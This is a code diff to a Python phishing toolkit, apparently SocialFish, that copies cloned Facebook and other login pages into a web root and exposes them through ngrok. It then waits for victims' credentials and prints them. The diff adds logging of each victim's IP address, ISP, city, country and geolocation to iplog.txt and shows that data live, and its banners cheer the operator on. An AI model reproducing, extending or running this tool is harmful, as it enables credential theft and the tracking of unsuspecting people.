@@ -57,20 +57,20 @@ def end():
                           {1}F I S H{2}                ~--___--~
                {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
-[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)
+[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)
 
 def loadModule(module):
        print '''{0}
    _.-=-._     .-, 
  .'       "-.,' / 
-(          _.  < 
+( AnonUD4Y  _.  < 
  `=.____.="  `._\\
 
 
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
+    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt')
     if option2 == '1' and social == 'Facebook':
         system('cp WebPages/fb_standard/*.* Server/www/')
     if option2 == '2' and social == 'Facebook':
@@ -115,27 +115,35 @@ def waitCreds():
 (  AnonUD4Y_  ~.< 
  `=.____.="  `._\\ 
  
- [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION  
- [{1}*{0}]{1} JUST GOTO YOUR [ SocialFish/server/www/iplog.txt ]
- [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
+ [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION . 
+ [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
    
     print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
+            print '======================================================================'.format(RED, END)
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-            print ' {0}VICTIM INFORMATION AVAILABLE IN [ server/www/iplog.txt ]{1}\n {0}{1}'.format(RED, END)
-            print ' {0}HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE AVILABLE TO ALL PEOPLE {1}\n {0}{1}'.format(RED, END)
+            print '======================================================================'.format(RED, END)
+            print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
+            
+        creds.close()
+        with open('Server/www/iplog.txt') as creds:
+            lines = creds.read().rstrip()
+        if len(lines) != 0: 
+            print '======================================================================'.format(RED, END)
+            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            system('rm -rf Server/www/iplog.txt && touch Server/www/iplog.txt')
+            print '======================================================================'.format(RED, END)
+            
         creds.close()
 
 def runPEnv():
     system('clear')
     print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
-                          '
-                        '   '
-                      '       '
+                       .   .  . 
                  .  '  .        '                        '
              '             '      '                   '   '
   ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
@@ -216,7 +224,7 @@ def runNgrok():
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, RED)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
 
 def runServer():
